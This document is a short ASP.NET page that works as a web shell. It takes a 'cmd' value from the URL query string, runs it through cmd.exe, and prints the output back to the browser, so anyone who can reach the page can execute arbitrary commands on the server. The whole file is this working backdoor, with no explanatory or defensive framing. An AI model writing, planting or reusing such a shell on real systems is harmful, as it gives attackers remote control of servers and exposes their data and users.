<%@ Page Language="C#" %>
<% 
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd))
{
    System.Diagnostics.Process process = new System.Diagnostics.Process();
    process.StartInfo.FileName = "cmd.exe";
    process.StartInfo.Arguments = "/c " + cmd;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.UseShellExecute = false;
    process.Start();
    Response.Write("<pre>" + process.StandardOutput.ReadToEnd() + "</pre>");
}
%>
